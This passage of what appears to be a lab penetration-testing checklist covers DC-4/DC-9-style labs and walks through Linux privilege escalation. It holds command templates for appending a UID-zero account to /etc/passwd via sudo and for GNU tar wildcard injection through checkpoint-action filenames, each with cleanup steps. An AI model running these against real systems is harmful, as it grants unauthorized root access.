```bash
'<absolute-observed-trusted-target-python3>' -I '<absolute-reviewed-local-lab-account-append.py>' prepare --account-file /etc/passwd --directory '<new-absolute-private-account-recovery-directory>' --username '<same-unique-lab-account>'
```

Before the append, validate the prepared copies and unchanged original using

**Two-file form**, observed in DC-9:

```bash
'<absolute-observed-trusted-target-python3>' -I '<absolute-reviewed-local-lab-account-append.py>' check-original --account-file /etc/passwd --directory '<same-private-account-recovery-directory>' --original-sha256 '<recorded-original-account-sha256>' &&
printf '%s  %s\n' '<recorded-append-program-sha256>' '<same-absolute-observed-allowed-append-program>' | sha256sum -c - &&
sudo -u '<exact-UID-zero-run-as-account>' -- '<same-absolute-observed-allowed-append-program>' '<same-private-account-recovery-directory>/record' /etc/passwd
```

**Stdin append form**, observed in DC-4. Require the exact observed NOPASSWD
rule and `-a /etc/passwd` argument permission. `sudo -n` refuses authentication

Pipe failure remains visible through subshell-only `pipefail`; potential tee

```bash
'<absolute-observed-trusted-target-python3>' -I '<absolute-reviewed-local-lab-account-append.py>' check-original --account-file /etc/passwd --directory '<same-private-account-recovery-directory>' --original-sha256 '<recorded-original-account-sha256>' &&
printf '%s  %s\n' '<recorded-append-program-sha256>' '<same-absolute-observed-allowed-append-program>' | sha256sum -c - &&
(set -o pipefail; cat -- '<same-private-account-recovery-directory>/record' | sudo -n -u '<exact-UID-zero-run-as-account>' -- '<same-absolute-observed-allowed-append-program>' -a /etc/passwd >/dev/null)
```

For the two-file form only, use the permitted current-user sudo password prompt,
if required. The stdin form requires its observed NOPASSWD context. Do not

With the exact append verified, make **one** local login using the fresh lab


If a shell opens, check native numeric authority and the assigned host:

```bash
/bin/hostname
/bin/grep -E '^(Uid|Gid|NoNewPrivs):' /proc/$$/status
/bin/cat /proc/self/uid_map
```

| Observed result | Next choice |
| --- | --- |

| Login denied, unavailable TTY, unsupported password policy or wrong identity | **PAUSE-RECOVERY** and the already available root console/reset route. No repeated guessing, shadow edit or newly enabled SSH login. |

```bash
printf '%s  %s\n' '<recorded-target-python-executable-sha256>' '<absolute-observed-trusted-target-python3>' | sha256sum -c - &&
printf '%s  %s\n' '<recorded-reviewed-helper-sha256>' '<absolute-reviewed-local-lab-account-append.py>' | sha256sum -c - &&
'<absolute-observed-trusted-target-python3>' -I '<absolute-reviewed-local-lab-account-append.py>' restore --account-file /etc/passwd --directory '<same-private-account-recovery-directory>' --original-sha256 '<recorded-original-account-sha256>'
printf '%s  %s\n' '<recorded-original-account-sha256>' /etc/passwd | sha256sum -c -
getent passwd '<same-unique-lab-account>' >/dev/null
printf 'Removed name lookup exit: %s\n' "$?"
```

Require helper exit zero, original hash match and name lookup `2`. Then `exit`

UID-zero process is not automatically revoked by removing its account record;
close it explicitly. Do not use `userdel`, especially not `userdel -r`, against
this UID-zero record. No home directory was created by the helper; `/root` is

Keep needed evidence privately, then remove only the four preparation files
from the original parent. A failed restoration must retain them:

```bash
rm -i -- '<same-private-account-recovery-directory>/record' '<same-private-account-recovery-directory>/expected' '<same-private-account-recovery-directory>/original' '<same-private-account-recovery-directory>/manifest.json'
rmdir -- '<same-private-account-recovery-directory>'
test ! -e '<same-private-account-recovery-directory>' && printf 'Account recovery directory absent\n'
```

If removal is refused or unexpected files appear, leave them untouched. Remove the

## LPRIV-15. Does a privileged GNU tar wildcard consume option-like filenames?

Enter from **LNX-06/LNX-09** only when the observed higher-privilege job runs
GNU tar with a shell-expanded `*`, its working directory is known, the current
user can create files there and the natural trigger time is known.

Confirm the two GNU tar features used by this exact hypothesis:

```bash
tar --version | head -n 1
tar --help | grep -E 'checkpoint|checkpoint-action'
```

In the observed writable working directory, choose a fresh run ID. Stop if any
of the four named paths already exists. Replace the proof path with a new path
the current user can read:

```bash
cd '<absolute-observed-writable-working-directory>'
test ! -e 'owb-tar-proof-<RUN_ID>.sh'
test ! -e './--checkpoint=1'
test ! -e './--checkpoint-action=exec=sh owb-tar-proof-<RUN_ID>.sh'
test ! -e '<new-absolute-proof-path>'
printf '#!/bin/sh\nid > <new-absolute-proof-path>\n' > 'owb-tar-proof-<RUN_ID>.sh'
chmod +x 'owb-tar-proof-<RUN_ID>.sh'
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh owb-tar-proof-<RUN_ID>.sh'
```

Wait for the already observed natural trigger, then read the proof:

```bash
cat '<same-absolute-proof-path>'
```

| Result | Next choice |
| --- | --- |
| Output shows the expected higher-privilege identity and matches the job time | Record the privilege transition, then **LNX-01** for that proven identity only if an independently usable session exists. A proof file is not a shell. |
| Output shows the current user | **LNX-06**. The observed consumer or trigger identity was wrong. |
| Proof is absent | **LNX-06/LNX-09** for the exact trigger, working directory, wildcard expansion or freshness condition. Do not change several prerequisites at once. |
| Tar lacks checkpoint actions or the job does not expand `*` in that directory | This procedure does not apply; **LNX-10** for another observed lead. |

After recording the result, remove only the three files created for this check
and the proof path if it exists:

```bash
rm -- './--checkpoint=1' './--checkpoint-action=exec=sh owb-tar-proof-<RUN_ID>.sh' './owb-tar-proof-<RUN_ID>.sh' '<same-absolute-proof-path>'
```

Do not alter the scheduled script, job definition or archive. If the job has a
file-age condition, create the files in the matching interval rather than
changing the payload or scheduler.

# Explanations and troubleshooting

## NET-01. What decides this step?

ICMP replies prove reachability, not open services.

## NET-02. What decides this step?

A full TCP scan is the coverage baseline; `-Pn` skips discovery, not filtering.

## NET-03. What decides this step?

One unclear port gets one native check; a version guess is a lead.

## NET-04. What decides this step?

UDP is spent only on a specific clue, and `open|filtered` is not open.

## NET-05. What decides this step?

The scan does not rank leads; pick one service and open its task.

## FTP-01. What decides this step?

A listing proves the login, not read access to a file.

## FTP-02. What decides this step?

One completed read is the evidence; a transfer alone is not execution.

## SMB-01. What decides this step?

Share names say nothing about permissions.

## SMB-02. What decides this step?

Read one file with the same identity that listed the share.

## SSH-01. What decides this step?

Host key and account availability are separate prerequisites.

## SSH-02. What decides this step?

A login is not a shell until host and identity are attributed.

## WEB-01. What decides this step?

Triage identifies the app and its visible functions before any payload.

## WEB-04. What decides this step?

Unlinked discovery needs a missing-path baseline to cut wildcard noise.

## WEB-03. What decides this step?

Fingerprinting produces hints; only a response confirms a version.

## WEB-06. What decides this step?

Change one GET value and compare it with the normal response.

## WEB-08. What decides this step?

Keep the captured method, content type and required fields.

## WEB-05. What decides this step?

`--resolve` tests one name without changing system DNS.

## WEB-07. What decides this step?

Parameter guessing applies only when the page implies an input.

## WEB-09. What decides this step?

A permitted account opens the function; login is not permission.

## WEB-10. What decides this step?

Read the upload request and delete route before creating a file.

## WEB-11. What decides this step?

Inventory a confirmed CMS, then pick one matching local source.

## WEB-12. What decides this step?

WebDAV and default-file checks are read-only; a `DAV` header is a lead.

## AD-01. What decides this step?

Domain and controller names come before any authentication.

## AD-02. What decides this step?

Each anonymous protocol read is separate; one denial says nothing about the others.

## AD-03. What decides this step?

One login validates one credential on one host.

## AD-04. What decides this step?

Read one share file with the identity that authenticated.

## AD-21. What decides this step?

ntds.dit needs the matching SYSTEM hive from the same backup.

## AD-05. What decides this step?

Inventory users, computers and SPNs for targeted follow-up.

## AD-06. What decides this step?

GPP files either yield a candidate or send you back to SYSVOL.

## AD-07. What decides this step?

AS-REP and service tickets are alternatives, not a pair.

## AD-08. What decides this step?

The hashcat mode depends on the captured Kerberos prefix.

## AD-09. What decides this step?

Graph edges are candidates until source, membership, target and right match.

## AD-10. What decides this step?

A LAPS value is scoped to one computer and account.

## AD-11. What decides this step?

Replication rights return material; they do not open a shell.

## AD-12. What decides this step?

WinRM is its own login path and needs its own host.

## AD-13. What decides this step?

An existing admin indication avoids repeating the SMB login.

## AD-14. What decides this step?

Collection is valid only after same-host admin proof.

## WIN-01. What decides this step?

Host and token, not the username, decide the next branch.

## WIN-16. What decides this step?

One non-standard path at a time; no drive recursion.

## WIN-02. What decides this step?

Native checks or one reviewed scanner, then one path at a time.

## WIN-03. What decides this step?

Credential Manager, history and saved targets are bounded reads.

## WIN-13. What decides this step?

Build and feature checks gate a patch candidate.

## WIN-14. What decides this step?

Stage the reviewed build with a hash check before executing.

## WIN-04. What decides this step?

Service replacement needs a hash-checked backup and an immediate restore.

## WIN-05. What decides this step?

The scheduled variant adds a trigger, not a different recovery rule.

## WIN-06. What decides this step?

A version matters only with a consumer and an execution context.

## WIN-07. What decides this step?

Both AlwaysInstallElevated hives must be `1`.

## WIN-08. What decides this step?

`SeImpersonatePrivilege` plus a reviewed tool and a live spooler.

## WIN-15. What decides this step?

One staged artifact, one attempt, reset afterwards.

## AD-15. What decides this step?

WebDAV needs an authenticated listing and a fresh filename before upload.

## AD-16. What decides this step?

RBCD is safe only from an empty baseline with both cleanup steps.

## AD-17. What decides this step?

A gMSA value still needs its own service login.

## AD-18. What decides this step?

GPO edits need a fresh backup and a restore check.

## WIN-09. What decides this step?

Utilman replacement is recoverable only with a backup and trusted RDP.

## WIN-10. What decides this step?

RunasCs needs one validated plaintext identity.

## WIN-11. What decides this step?

SeManageVolume needs the DLL backup and a broad-ACL reset.

## SNMP-01. Why scan one UDP port and guess communities?

161 is UDP, so a TCP scan never shows it; a `smux` listener on 199 is the
side-channel that an agent exists. Testing `public`/`private` is cheaper and more
honest than waiting for a supplied string that a box usually never provides.
`-t 3 -r 0` keeps a dead attempt short, and `-On` prints numeric OIDs so no local
MIB names are needed. SNMPv1 is enough for a read test; v3 only matters when a user
and passphrases were actually supplied.

Silence can be a wrong community *or* a filter in front of the agent. Keep the two
apart: a rejection means the agent answered, a timeout does not. The
[`snmpget` manual](https://www.net-snmp.org/docs/man/snmpget.html) and
[UDP scan behaviour](https://nmap.org/book/scan-methods-udp-scan.html) cover the
client and transport details.

## SNMP-02. What do process and package rows actually prove?

`hrSWRunParameters` is the useful part: daemons often carry their config path,
socket or bind address on the command line. `hrSWInstalledName` answers a
different, version-shaped question. Both live in the
[Host Resources MIB](https://www.rfc-editor.org/rfc/rfc2790.html).

The agent's copy can be truncated, stale or blind to a container, so treat a row as
a pointer and confirm it on the service. An installed package is not a running
process, and a version string is not proof that an advisory applies. Walking once
into a file and grepping beats repeated targeted walks, and it preserves the
partial output when an agent stalls.

## LNX-01. Keep the first identity check small

An exact user-level objective can be checked before privilege enumeration when
this session is already attributed to the assigned host. the exact objective proof supplies the
file read and denial result; keep proof private without closing the shell.
If the objective is absent or not assigned, start with LNX-03. Do not infer a
path from the username or call access proven because a file is named.

`id` exposes the current process's identities and groups. `uname` reports kernel/
machine information while userspace width need not equal a particular vulnerable
process's width. Correlate host/session evidence before choosing payloads or claiming
an objective. Request additional details only for that specific question:

```bash
uname -srm
id -u
id -ru
getconf LONG_BIT
head -n 15 /etc/os-release
ip -brief address
```

Userspace width belongs to payload/build matching; interfaces can corroborate
the connection when host attribution is uncertain. Neither belongs in every
routine sudo check. See [id](https://man7.org/linux/man-pages/man1/id.1.html).

## LNX-02. Why namespace and restriction fields are only context?

UID maps, cgroups and mount/namespace identities support context assessment. None
is a universal container detector. A zero UID can exist in a separate user namespace.
NoNewPrivs, seccomp and capability bounds can change what a later process may do.
This is a conditional diagnostic, not a required precursor to ordinary non-root
enumeration. Keep it before host-root assertions and relevant mechanism tests.
If the unresolved question is specifically whether the current root is on a
different or restricted mount, inspect that mount only then:

```bash
findmnt -T / -o TARGET,SOURCE,FSTYPE,OPTIONS
```

See [process status](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html).

## LNX-03. Why list delegation before invoking the binary?

The exact run-as identity, executable, allowed arguments and tags determine the
permission. Noninteractive listing avoids a surprise password attempt; a password
requirement is not a denial. Do not weaken environment policy or edit sudoers.
See [sudo](https://manpages.debian.org/testing/sudo/sudo.8.en.html).

The tasks cover Bash and exact GNU find/Python child execution, not every sudo lead.
The original rule and path checks remain the prerequisites. More-specific
executable techniques must be authored rather than inferred from a broad title.

## LNX-04. Why parent paths, ACLs and mounts?

File read, directory search, directory replacement and executable invocation are
different operations. ACLs and read-only/noexec/nosuid mounts can invalidate a mode-
bit-only inference. `test` evaluates a permission predicate, not a complete execution
or write trial. See [namei](https://man7.org/linux/man-pages/man1/namei.1.html).

For a path whose displayed mode conflicts with the relevant predicate, inspect
its ACL. For a suspected read-only/noexec/nosuid mount, inspect that path's
mount. Neither is part of every ordinary file question:

For an actual `Read-only file system` error, inspect the mount in the same shell
that observed the failure. A service-created process can inherit a different
mount namespace from an ordinary login. Mode bits do not override a read-only
mount. Do not change confinement or remount a filesystem to resolve the check.
Choose the one command answering the uncertainty below, not both by default:

```bash
getfacl -p -- '<absolute-observed-path>'
findmnt -T '<absolute-observed-path>' -o TARGET,SOURCE,FSTYPE,OPTIONS
```

## LNX-05. Why retain inventory limits?

The find inventory stays on one filesystem and can expire; errors/omitted mounts
remain uncovered. Capabilities have file/process/environment prerequisites, not
just a name-to-exploit lookup. See [find](https://man7.org/linux/man-pages/man1/find.1.html),
[getcap](https://man7.org/linux/man-pages/man8/getcap.8.html) and
[capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html).

When the specific SUID/capability lead depends on `nosuid`, `noexec` or a
read-only mount, inspect that observed binary's mount:

```bash
findmnt -T '<absolute-observed-binary-path>' -o TARGET,SOURCE,FSTYPE,OPTIONS
```

The matched task tests actual identity under the relevant mechanism. It retains
denied or constrained outcomes without equating failure with complete absence of
privilege opportunities. Root within a namespace remains a distinct boundary.

## LNX-06. Why consumer identity and actual trigger?

Running-unit discovery gives a real unit name when the previous inventory had
no candidate. It omits inactive and already-exited services, and it does not prove
the unit's account or path is exploitable. A listed service is a clue, not a
requirement to inspect every unit. Denied or empty visible extent does not prove
the host has no jobs.

If a timer-backed service or scheduled execution is an actual lead, list timers
to identify its timing rather than dumping them for every service:

```bash
systemctl list-timers --all --no-pager
```

If the one selected unit's current running state or recent failure remains
unclear after `systemctl show`, inspect its status then:

```bash
systemctl status '<observed-unit.service>' --no-pager
```

A writable script is useful only in the context of its actual invocation. Retain
unit drop-ins, wrappers, working directory, configured user and current state.
Timers and cron entries are configuration observations, not proof of execution.
Inspection does not authorize restarts or task edits. Service-specific mutation
and restoration procedures remain to be authored for supported hypotheses.
See [systemctl introspection](https://manpages.debian.org/testing/systemd/systemctl.1.en.html).

The scheduled proof establishes the exercised consumer's identity only when the
trigger, owner and output agree. Original script restoration and normal consumer
behavior are checked before discarding backup. A separate reviewed access method
is still needed if a foreground interactive session is required.

## LNX-07. Why targeted configuration instead of a secret dump?

`ls -la` includes hidden entries that a plain listing misses. Choose a file for
its relationship to the current account/application, not simply because its name
looks private. Histories can contain stale commands, and backups can describe a
different deployment. Local mail may be under `/var/mail` or `/var/spool/mail`,
but neither location guarantees a mailbox. Use the current account or an observed
mail/service clue to identify an exact file, not every user's mailbox.

If a known application root is too large to list usefully, this optional bounded
filename search can help locate config candidates without reading their contents:

```bash
find '<absolute-observed-application-directory>' -maxdepth 2 -type f \( -name '.env' -o -name '*.conf' -o -name '*.ini' -o -name '*config*.php' -o -name '*config*.yaml' \) -print
```

`head -c` limits bytes, including files with one very long line. `cat -v` makes
control bytes visible; it does not redact secrets. The selected working blocks
use Bash `pipefail` in a subshell so a failed `head` read produces a nonzero
reported exit even when `cat -v` itself succeeds. The parent shell's option is
unchanged. Retain errors and distinguish a successful empty read from a denied
or missing file. See the [Bash pipeline](https://www.gnu.org/software/bash/manual/html_node/Pipelines)
and [subshell](https://www.gnu.org/software/bash/manual/html_node/Command-Execution-Environment.html)
rules.

An observed root and bounded range keep the question attributable. Retain the exact
source of a credential-looking value and validate permitted use separately. A
config may be stale or belong to another deployment. Sensitive contents stay in
protected adventure data, never this checklist or the shared project log.

## LNX-08. Why run loopback checks on the target?

Loopback belongs to the current host/network namespace. Binding there does not make
the listener reachable from Kali. Forwarding or a changed namespace is a new access
context. `ss` process visibility depends on permissions. See
[ss](https://man7.org/linux/man-pages/man8/ss.8.html).

## LNX-09. Why not a universal privilege-escalation one-liner?

No candidate means reassessment, not an invented path to satisfy a template.
Matched built-in LPRIV procedures already provide their concrete entry checks
and cleanup. EXP-01/02 applies when selecting another actual exploit candidate;
it is not an extra mandatory layer before every native privilege operation.

Binary behavior, sudo argument rules, capability sets, distribution patches and
consumer triggers vary. This decision settles prerequisites; the supported exact
technique still needs a reviewed command sequence and cleanup. Current gaps are
not disguised as completed exploitation coverage. One higher-identity banner is
not an independently attributed session; verification returns through EXP-03.

For an exact SUID/capability or executable-path hypothesis where `nosuid`,
`noexec` or read-only mount behavior can change the decision, inspect that
path's mount. Do not request it for every package/version question:

```bash
findmnt -T '<absolute-observed-executable-or-consumed-path>' -o TARGET,SOURCE,FSTYPE,OPTIONS
```

## LNX-10. Why revisit narrowly after identity changes?

New groups or credentials can change specific denied operations, but do not erase
earlier results. Preserve time/identity with each observation and retain a concrete
resume condition when stuck. All ten tasks trace to `LNX-001` through `LNX-004` in
[checklist.md](checklist.md). Existing sanitized reviews are context, not new
prospective Linux trials. No target was contacted while authoring this revision.

## LPRIV-01. Delegation is constrained by the actual rule

Sudo run-as identity, executable/argument matching, authentication and policy tags
are separate prerequisites. An allowed fixed command does not imply permission
to invoke Bash. A different user's shell is a real identity transition without
necessarily being root. Timestamp invalidation is authentication cleanup, not
restoration of another process or file. See the [sudo manual](https://manpages.debian.org/trixie/sudo/sudo.8.en.html).

## LPRIV-02. Attributes become process credentials only under the right conditions

GNU Bash can drop a differing effective identity unless privileged mode is used.
Long options are placed before `-p`. File capability effectiveness, mount flags,
NoNewPrivs and namespaces affect exec credential transitions. SETUID is different
from unrestricted filesystem access. The Python call changes the process UID;
the subsequent shell must corroborate it and the host boundary.

Sources: [Bash manual](https://manpages.debian.org/trixie/bash/bash.1.en.html),
[Linux capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html),
[execve](https://man7.org/linux/man-pages/man2/execve.2.html), and
[Python os.setuid](https://docs.python.org/3/library/os.html#os.setuid).
Zsh's `-p` retains privileged startup mode, while `-f` disables RCS after
the mandatory system startup file. Different real and effective IDs are a
normal possible SUID result. See [Zsh options](https://zsh.sourceforge.io/Doc/Release/Options.html)
and [Zsh startup files](https://zsh.sourceforge.io/Doc/Release/Files.html).
The GDB branch uses the build's embedded Python, with `-nx` and no inferior.
`os.execl` replaces the debugger directly. The initial UID tuple and final shell
identity are separate results; a root-looking GDB prompt is neither. See
[GDB Python commands](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Python-Commands.html),
[GDB mode options](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Mode-Options.html)
and [Python exec functions](https://docs.python.org/3/library/os.html#os.execl).
The PHP branch uses the CLI `-r` form and requires the `pcntl_exec` function on
the **same** SUID binary. `pcntl_exec` replaces its process on success; a
function check, inherited file owner or absent return value is not a shell
identity result. The target's `/bin/sh -p` support and real/effective UID must
be checked separately. See [PHP CLI options](https://www.php.net/manual/en/features.commandline.options.php)
and [pcntl_exec](https://www.php.net/manual/en/function.pcntl-exec.php).
Permitted-only capabilities, other binaries and container escape require distinct
procedures; these examples do not close those coverage gaps.

## LPRIV-03. Demonstrate the consumer, then undo the exact change

The working sequence is inspect/backup, guarded append, natural-trigger proof,
then restore/cleanup. Each command repeats literal placeholders rather than
depending on prior shell variables. The backup and expected copy are this
operation's state, not reusable setup for unrelated checklist steps.

The byte backup does not restore metadata. In-place writing avoids replacing a
root-owned inode with the user's copy, but writes can clear security attributes.
Do not use this procedure where those attributes exist or metadata restoration
is uncertain. A disposable-lab reset is recovery, not evidence of exact restoration.
Never recursively remove the temporary root or delete recovery copies early.

The append now checks ACL as well as bytes and metadata and compares the result
to the prepared expected copy. These checks detect selected changes; they do not
lock the file or make concurrent scheduler execution race-free. Partial appends,
path changes or a running consumer require recovery rather than an automatic retry.

The expected copy lets the restore guard distinguish this proof from a concurrent
edit. ACL capture must succeed before comparison; two empty files left by failed
commands are not permission evidence. Restoration writes into the original inode
and confirms the bytes rather than replacing it with a user-owned backup. Mode
0644 permits reading the proof while its directory remains private mode 0700.

The proof exercises the actual scheduled execution context rather than inferring
it from ownership or a configured user. A private directory avoids an unrelated
user pre-creating the proof path. Its owner can inspect/remove the named proof even
when the scheduler created the file under a different UID. Filesystem restrictions
or sandboxing can prevent that behavior and must remain explicit.

Appending may never execute if the script exits early. In-place restoration can
also interact with extended attributes or concurrently running consumers; record
those before testing and restore/verify the real state, not only bytes. This
procedure deliberately avoids manufacturing a SUID binary or persistent root
job. Confirmed privileged execution still requires a separate reviewed foothold
method if an interactive session is the next objective.

## LPRIV-04. A capability is an operation-specific boundary

Optional diagnostics when an actual operation fails or its boundary is unclear:

```bash
findmnt -T '<absolute-observed-capability-bearing-executable>' -o TARGET,SOURCE,FSTYPE,OPTIONS
grep -E '^(Uid|Gid|CapEff|CapBnd|NoNewPrivs|Seccomp):' /proc/self/status
capsh --print 2>/dev/null | sed -n '1,24p' || printf 'capsh unavailable; retain partial capability evidence.\n'
```

Optional low-port reference, only for a specific authorized question and recorded
`cap_net_bind_service=ep` on this Python 3 executable. Use an unused loopback port:

```bash
'<same-observed-capability-bearing-python3>' - '<unused-loopback-port-below-1024>' <<'PY'
import socket, sys
port = int(sys.argv[1])
if not 1 <= port <= 1023:
    raise SystemExit('Choose an unused port below 1024')
sock = socket.socket()
try:
    sock.bind(("127.0.0.1", port))
    print("loopback bind succeeded")
finally:
    sock.close()
PY
printf 'Capability probe exit: %s\n' "$?"
```

The socket closes immediately, including on error. A success is not a shell or
proof that the file capability caused the bind. Existing process rights and
kernel policy can permit it independently; keep attribution unresolved when
they are unknown. Occupied ports and denied operations also remain ambiguous.
Do not listen, accept connections or use a network-facing address. Return to
LPRIV-04's result choices after the selected check.

Linux file capabilities attach to an executable and can be filtered by the mount,
process bounding set, `NoNewPrivs` and namespace. `cap_net_bind_service` can allow
a low loopback port without granting root. A successful bind also needs attribution
to the tested process and an unused port. Do not turn a harmless bind into a generic
recipe for file reads, UID changes or container escape. Other capabilities need
their own observed operation and rollback analysis.

## LPRIV-05. A service unit is not proof of a running privileged consumer

`systemctl cat` may be superseded by drop-ins, and `ExecStart` can contain an
interpreter, arguments or an environment expansion. `User=` and `Group=` identify
the configured service account, while an unset value follows manager defaults.
The unit can be inactive, masked or replaced before a trigger. This procedure
deliberately stops before restart or path modification. A writable service path is
a lead requiring a separate, reversible procedure, not a privilege assertion.

## LPRIV-06. Child execution depends on the complete sudo rule

The executable name alone is insufficient. Match run-as user/group, allowed
arguments, exclusions and inherited policy. A required non-default run-as group
needs its exact permitted `-g` value; these examples do not assume one. Fixed
script/path rules are not unrestricted Python or find delegation.
NOEXEC can block child execution, while INTERCEPT can check the child against
sudoers. Keep a denial rather than treating it as a reason to disable controls.
See the [upstream sudoers manual](https://www.sudo.ws/docs/man/1.9.14/sudoers.man.pdf).

GNU find's `-exec` receives arguments through the terminating literal semicolon.
The escaped `\;` prevents the parent shell from consuming it. With one start
path and `-maxdepth 0`, the action concerns that path only, not a recursive scan.
See [GNU find depth limits](https://www.gnu.org/software/findutils/manual/html_node/find_html/Directories.html)
and [command actions](https://www.gnu.org/software/findutils/manual/html_node/find_html/Single-File.html).

Python's `os.execl` replaces the interpreter with the supplied Bash executable;
it does not call `setuid` or create an additional network channel. Python `-I`
limits ordinary Python search-path/environment customization, not sudo policy.
See [Python exec functions](https://docs.python.org/3/library/os.html#os.execl)
and [isolated mode](https://docs.python.org/3/using/cmdline.html#cmdoption-I).
The new shell's observed identity, not the delegated executable's output or exit
status, determines the result. Native sudo policy and terminal behavior still
need live authorized trials; mock argv tests are not privilege verification.

GNU time runs one supplied command with its remaining arguments and reports
resource use after that command exits. The working example does not use output
or append options, so it creates no timing file. Its report is not privilege
proof. See [GNU time invocation](https://www.gnu.org/software/time/manual/html_node/Invoking-time.html).

Perl's explicit `exec PROGRAM LIST` form replaces the interpreter with the
named program and arguments. The code uses the first literal argument as that
program, so a path containing spaces remains one argument. It does not invoke
an intermediate shell to parse a command string. A blocked exec is an error,
not a reason to disable sudo policy. See [Perl exec](https://perldoc.perl.org/functions/exec).
GNU nice runs its supplied child with adjusted niceness. A valid command can
inherit the delegated effective identity, but scheduling output proves neither
identity nor host attribution. Restricted child paths still need a matching
procedure. See [GNU nice invocation](https://www.gnu.org/software/coreutils/manual/html_node/nice-invocation.html).

## LPRIV-07. Temporary SUID access is a separate, higher-impact choice

The verified root consumer creates a new executable through GNU install. Numeric
mode 4755 requests owner SUID and executable/readable bits; the fresh private
directory limits ordinary traversal to its owner and root. A root-owned SUID
artifact still exists until explicitly removed. This is why the entry requires
disposable-lab permission rather than silently upgrading an id proof.
See [GNU install options](https://manpages.debian.org/testing/coreutils/install.1.en.html).

Bash `-p` retains an effective identity provided by execution; it does not create
root from an ordinary copy. nosuid, noexec, NoNewPrivs and namespaces can block or
limit the transition. See [Bash privileged mode](https://www.gnu.org/software/bash/manual/bash.html).
The source binary must already be attributable GNU Bash, not an arbitrary file
that merely has a Bash-like filename.

The appended command refuses a pre-existing destination, including dangling
symlinks. This is not a filesystem lock or a race-free scheduler protocol.
Independent bytes/owner/mode and shell identity checks remain necessary. Restore
the scheduled source first to prevent later recreation, then remove the exact
privileged artifact. Unexpected concurrent edits preserve recovery copies.
No root scheduler, install/SUID creation or resulting shell has been live tested.

## LPRIV-08. Client authority and server authority are different

The FunboxEasyEnum source first puts a shell command at the SQL prompt and
receives a syntax error, then uses the client's `\!` command and obtains
native uid0. The child executes under the local client process's authority.
Neither SQL grants nor a remote database username explains that host privilege.
The checklist uses an observed local socket and separate native identity proof
to avoid merging those contexts.

Client version and policy matter. MariaDB sandbox mode disables `system`, and
MySQL versions can disable client commands or the system command. A disabled
feature is a failed prerequisite here, not permission to enable it. The shown
connection uses the known local socket/account, no SQL mutation, no auto-rehash
inventory and no reconnect loop. Client login/history behavior still needs a
native authorized trial. See [MariaDB client commands and sandbox](https://mariadb.com/docs/server/clients-and-utilities/mariadb-client/mariadb-command-line-client)
and [MySQL client commands](https://dev.mysql.com/doc/refman/9.7/en/mysql-commands.html).

## LPRIV-09. Encoding transports bytes, not authority

An existing SUID encoder may open a file under its owner's effective identity.
Decoding its output does not change the calling shell's identity. The extra
8193rd byte detects an over-budget result even when a small producer finishes
before the output limiter closes. `pipefail` also preserves encoder/decoder
failures; normal SIGPIPE from a stopped large stream is not complete success.
Mode 600 and a private parent protect the new copy, while noclobber prevents
overwriting an existing path. These shell checks do not eliminate races in an
untrusted parent, so a shared directory is not an acceptable destination.
See [GNU base32](https://www.gnu.org/software/coreutils/manual/html_node/base32-invocation.html).
Native SUID read validation remains pending; ordinary round-trip fixtures test
the capture boundary, not privileged filesystem access.

## LPRIV-10. A no-index diff reads without staging

Git's `diff --no-index` compares filesystem paths and implies exit-code mode.
Against `/dev/null`, ordinary nonempty text appears as added lines and exits 1.
Empty-file creation metadata can also differ, and file-open errors may use 1.
Only the actual diff plus absence of errors supports the read result.
`--no-pager`, `--no-ext-diff` and `--no-textconv` prevent this procedure from
becoming a pager or configured external-filter shell. `--text` makes the read
inspectable, while `cat -v` renders control bytes visibly. This is a file-read
procedure, not the source prose's unshown pager escape. No root-level Git init,
staging, privileged shell or credential success is asserted. A large input can
still cost Git memory despite the display bound. See
[Git diff](https://git-scm.com/docs/git-diff).

## LPRIV-11. A missing delegated script differs from a scheduled consumer

The sudo rule is the immediate consumer. Creating the exact absent file supplies
its bytes, but only invocation plus native target/run-as identity establishes
the transition. Fresh-file noclobber prevents an overwrite; inode/metadata/hash
checks detect changed state before execution and cleanup. They do not make a
shared parent race-free, so the trusted-parent prerequisite remains mandatory.
No new SUID permission is introduced. This is source-triggered manual authoring,
not a live reproduction of SoSimple or an autonomous app action.

For nice argument paths, sudoers wildcard matching and filesystem path resolution
are different operations. An argument wildcard can match slashes and spaces;
matching it does not verify the resolved executable. Keep both the literal
argument and canonical target. See [sudoers wildcard rules](https://www.sudo.ws/docs/man/1.9.14/sudoers.man.pdf).

## LPRIV-12. The installed dispatcher determines the operation

The Debian wrapper has different paths for standard service actions and its
SysV fallback. The latter can execute an init-directory-relative path, while
standard actions can dispatch to systemctl or update OpenRC bookkeeping.
Inspect the actual target implementation before using a relative shell name.
Environment clearing and a changed working directory also do not establish the
run-as account; native identity does. This branch neither manages a real service
nor claims every service wrapper supports the same behavior. See
[Debian service source](https://sources.debian.org/src/init-system-helpers/1.69/script/service)
and [service manual](https://manpages.debian.org/bookworm/init-system-helpers/service.8.en.html).

## LPRIV-13. Account text and numeric process authority differ

Inclusiveness's reviewed program asks a PATH-resolved command for account text,
then separately changes identity and opens a shell. The helper satisfies that
text check only. Its output is never independent identity evidence; an absolute
native `id` and the actual shell's numeric process status establish the result.
Do not apply this to every SUID binary or assume neighboring source matches it.

The `p` exec variants search PATH for names without a slash; a command-scoped
PATH reaches descendants without altering the original parent environment.
See [Linux exec path lookup](https://man7.org/linux/man-pages/man3/exec.3.html).
The reviewed `setuid` call still must succeed. Real/effective/saved identity and
namespace context explain a changed UID; a root-looking prompt does not.
See [Linux setuid semantics](https://man7.org/linux/man-pages/man2/setuid.2.html).

This procedure creates an ordinary text-printing helper, never a SUID helper,
account record or shell persistence file. Hash/metadata checks detect changed
custody, not races in a shared parent. Keep the private-parent prerequisite.
The launched shell can read startup files and retain history; returning and
removing the exact helper do not imply those effects were erased.

## LPRIV-14. An append right, an account and a shell are different results

The DC-4 stdin append and DC-9 two-file append share prepared account bytes,
verification and recovery, not invocation syntax. Omitting tee-like `-a` can
overwrite the original instead of appending. The stdin branch's NOPASSWD and
noninteractive sudo requirement prevents record input from becoming a password
prompt stream. Pipeline exit alone is not proof of correct account bytes;
verify exact state after either success or failure and recover unknown state
out of band. `check-original` is read-only and validates preparation before the
selected manual call; it cannot prevent a later competing writer.

The [GNU tee manual](https://manpages.debian.org/trixie/coreutils/tee.1.en.html)
